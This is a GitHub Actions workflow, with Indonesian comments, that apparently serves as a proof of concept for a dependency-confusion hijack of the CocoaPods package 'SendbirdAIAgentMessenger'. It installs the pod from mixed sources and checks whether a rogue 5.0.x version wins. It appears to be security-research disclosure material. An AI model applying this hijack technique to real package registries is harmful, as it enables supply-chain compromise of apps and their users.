name: Execute_PoC
on: [push, workflow_dispatch]

jobs:
  test-macos:
    runs-on: macos-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Force Create Minimal Xcode Structure
        run: |
          # 1. Bikin folder project manual
          mkdir -p DummyProject/DummyProject
          cd DummyProject
          
          # 2. Setup Git Credentials biar CocoaPods gak rewel
          git config --global user.email "attacker@researcher.com"
          git config --global user.name "Researcher"

          # 3. Bikin file .xcodeproj palsu (ini kuncinya biar pod install mau jalan)
          # Kita bikin direktori xcodeproj agar CocoaPods mendeteksi ada "project"
          mkdir -p DummyProject.xcodeproj

          # 4. Tulis Podfile yang ngebajak Sendbird
          cat <<EOF > Podfile
          source 'https://github.com/sendbird/sendbird-ios-distribution.git'
          source 'https://cdn.cocoapods.org/'
          platform :ios, '15.0'
          target 'DummyProject' do
            use_frameworks!
            # Ini yang bakal narik versi 5.0.x lu
            pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
          end
          EOF

      - name: Pod Install & Hijack Verification
        run: |
          cd DummyProject
          # 5. Jalankan install tanpa perlu interaksi manusia
          pod install --repo-update --verbose
          
          echo "--- FINAL EVIDENCE ---"
          # 6. Buktiin ke Tal kalau v5.0.x yang menang
          if grep -q "SendbirdAIAgentMessenger (5.0." Podfile.lock; then
            echo "SUCCESS: Hijacked version is installed!"
            cat Podfile.lock | grep SendbirdAIAgentMessenger
          else
            echo "FAILED: Version mismatch."
            cat Podfile.lock
          fi
